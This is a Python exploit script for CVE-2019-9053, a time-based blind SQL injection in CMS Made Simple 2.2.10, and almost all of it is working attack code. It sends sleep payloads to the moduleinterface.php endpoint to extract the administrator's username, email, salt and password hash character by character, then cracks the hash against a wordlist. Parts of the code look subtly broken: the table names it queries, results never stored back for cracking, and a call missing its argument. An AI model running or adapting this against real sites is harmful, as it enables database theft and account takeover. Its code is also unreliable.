# Title: CMS Made Simple 2.2.10 - SQL Injection 
# CVE : CVE-2019-9053

# i wrote it based on elder code on python.2.0 so i applied some enhancements to the code to make it faster and more efficient
# i enhanced the performance of the code by adding a time based sql injection original cve is h3re :  https://www.exploit-db.com/exploits/46453 

import requests
import time
import optparse
import hashlib
from termcolor import colored, cprint

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options, args = parser.parse_args()
if not options.url:
    print("[+] Specify a target URL")
    print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
    print("[+] Set the TIME variable appropriately, as this SQL injection is time-based.")
    exit()

url_vuln = f"{options.url}/moduleinterface.php?mact=News,m1_,default,0"
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = options.wordlist if options.wordlist else ""

def crack_password():
    global password, output, wordlist, salt
    with open(wordlist) as dict_file:
        for line in dict_file:
            line = line.strip()
            beautify_print_try(line)
            if hashlib.md5(str(salt + line).encode()).hexdigest() == password:
                output += f"\n[+] Password cracked: {line}"
                break

def beautify_print_try(value):
    global output
    print("\033c")
    cprint(output, 'green', attrs=['bold'])
    cprint(f'[*] Try: {value}', 'red', attrs=['bold'])

def dump_info(target, field):
    global flag, salt, output
    ord_value = ""
    while flag:
        flag = False
        for char in dictionary:
            temp_value = target + char
            ord_value_temp = ord_value + hex(ord(char))[2:]
            beautify_print_try(temp_value)
            payload = f"a,b,1,5))+and+(select+sleep({TIME})+from+cms_{field}+where+{field}+like+0x{ord_value_temp}25+and+user_id+like+0x31)+--+"
            url = f"{url_vuln}&m1_idlist={payload}"
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            target = temp_value
            ord_value = ord_value_temp
    output += f'\n[+] {field.capitalize()} found: {target}'
    flag = True

dump_info(db_name, "username")
dump_info(email, "email")
dump_info(salt, "salt")
dump_info(password, "password")

if options.cracking:
    crack_password()
else:
    beautify_print_try()
